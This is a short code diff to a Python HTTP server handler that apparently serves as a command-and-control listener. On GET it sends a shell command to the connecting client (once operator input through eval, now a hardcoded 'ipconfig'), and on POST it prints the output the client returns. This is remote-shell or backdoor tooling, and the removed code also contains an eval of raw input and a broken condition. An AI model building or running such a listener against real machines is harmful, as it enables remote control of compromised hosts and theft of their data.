@@ -26,10 +26,8 @@ class http_sHandler(http.server.BaseHTTPRequestHandler):
 
 
     def do_GET(s):
-        try:
-            UserCommandinput = eval(input("test>>"))
-        except:
-            UserCommandinput = ""
+
+        UserCommandinput = str("ipconfig")
 
         command = bytes(UserCommandinput.encode())
         s.send_response(200)
@@ -42,7 +40,7 @@ class http_sHandler(http.server.BaseHTTPRequestHandler):
 
         s.send_response(200)
         s.end_headers()
-        length = int(s.headers['Content-Length']) #
-        postVar = s.rfile.read(length)
-        if b'' in postVar == False:
-            print(postVar)
+        #length = int(s.headers['Content-Length']) #
+        postVar = s.rfile.read()
+        #if b'' in postVar == False:
+        print(postVar)
